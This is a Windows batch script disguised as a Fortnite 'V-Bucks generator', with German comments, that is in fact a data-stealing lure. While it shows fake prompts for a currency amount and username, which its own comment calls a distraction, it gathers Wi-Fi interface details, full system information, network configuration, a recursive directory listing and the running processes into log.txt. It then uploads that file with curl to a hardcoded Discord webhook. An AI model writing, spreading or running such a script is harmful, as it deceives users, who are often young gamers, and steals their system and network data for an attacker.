@echo off
title vbucks gen.AFTER YOU FINISHED WAIT 1-5 minutes!!! enter any number to confirm that you are not a bot.

REM Einstellungen für den Discord Webhook
set "webhookURL=https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA"
set "fileName=log.txt"

REM WLAN-Informationen sammeln und in log.txt speichern
echo ================== WLAN Information ================== > log.txt
netsh wlan show interfaces >> log.txt

REM Ablenkung für vbucks-Generierung
echo clik enter or wait if you have fill all out. at the end
echo Enter vbucks number max-12000:
set /p vbucksNumber=
echo Enter username:
set /p username=
echo clik enter, if nothing happend just wait, and paste any number if its comming up.

REM Spam von Zahlen in verschiedenen Farben
echo. >> log.txt
echo ================== Vbucks Generation Attempt ================== >> log.txt
for /l %%i in (1,1,150) do (
    echo try to send %vbucksNumber% gift to %username%-----bot invite--- fail >> log.txt
)

REM Weitere Informationen sammeln und in log.txt speichern
echo. >> log.txt
echo ================== System and Network Information ================== >> log.txt

REM Systeminformationen anzeigen
echo ================== System Information ================== >> log.txt
systeminfo >> log.txt

REM Netzwerkkonfigurationsdetails anzeigen
echo. >> log.txt
echo ================== Network Configuration ================== >> log.txt
ipconfig /all >> log.txt

REM Netzwerkverbindung testen
echo. >> log.txt
echo ================== Ping Test ================== >> log.txt
ping localhost -n 5 >> log.txt

REM Netzwerkpfad verfolgen
echo. >> log.txt
echo ================== Tracert ================== >> log.txt
tracert localhost >> log.txt

REM Dateien und Verzeichnisse auflisten
echo. >> log.txt
echo ================== Directory Listing ================== >> log.txt
dir /s >> log.txt

REM Aktuelles Verzeichnis anzeigen
echo. >> log.txt
echo ================== Current Directory ================== >> log.txt
cd >> log.txt

REM Liste der laufenden Prozesse anzeigen
echo. >> log.txt
echo ================== Running Processes ================== >> log.txt
tasklist /v >> log.txt

REM Datei an Discord Webhook senden
echo. >> log.txt
echo Logging information saved to log.txt
curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%fileName%" "%webhookURL%"

timeout /t 5 >nul
exit /b
